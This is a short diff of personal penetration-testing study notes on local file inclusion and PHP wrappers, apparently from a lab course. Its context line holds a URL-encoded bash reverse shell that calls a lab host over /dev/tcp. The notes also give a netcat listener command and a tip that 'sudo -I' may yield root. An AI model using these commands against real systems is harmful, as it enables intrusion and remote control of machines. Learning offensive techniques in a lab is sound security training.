@@ -112,11 +112,14 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%2
 start a netcat listener 
 nc -nvlp 4444
 
-XAMPP apache logs are stored at C:\xampp\apache\logs\
+XAMPP apache logs are stored at C:\xampp\apache\logs\access.log
 
 We can also do LFI in Pearl, ASP, ASPE, JSP or even Node.js
 
+Lab notes
+sometimes sudo -I will give you root if the account has the correct permissions
 
+### 9.2.2. PHP Wrappers
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
@@ -124,6 +127,9 @@ We can also do LFI in Pearl, ASP, ASPE, JSP or even Node.js
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+9.2.2. PHP Wrappers
+
+
 9.2.1. Local File Inclusion (LFI)
 https://owasp.org/www-community/attacks/Log_Injection
 https://httpd.apache.org/docs/2.4/logs.html
